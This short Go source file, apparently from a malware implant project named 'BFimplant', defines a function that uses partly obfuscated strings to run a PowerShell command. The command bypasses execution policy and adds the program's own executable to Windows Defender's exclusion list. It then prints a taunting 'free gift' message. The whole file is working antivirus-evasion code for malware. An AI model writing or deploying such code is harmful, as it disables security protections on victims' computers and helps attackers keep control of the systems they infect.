package per

import (
	"fmt"
    "BFimplant/winapiV2"
)

func Add_excep() {
    exePath := GetExecutablePath()

    comm := winapiV2.DecryptString("5*2 76- ))")+` -ExecutionPolicy Bypass Add-MpP`+winapiV2.DecryptString("7 # 7 +&")+`e -Force -Ex`+winapiV2.DecryptString("clusion")+`Path "`+exePath+`"`
    m , err := winapiV2.Exec(comm)

    if err != nil {	
        fmt.Printf("Error creaaaaaa shorrrrrrrrr: %v \n", err)
        return
    }
    fmt.Println(m)
    fmt.Println("thanks for that free gift <3 love you")
}

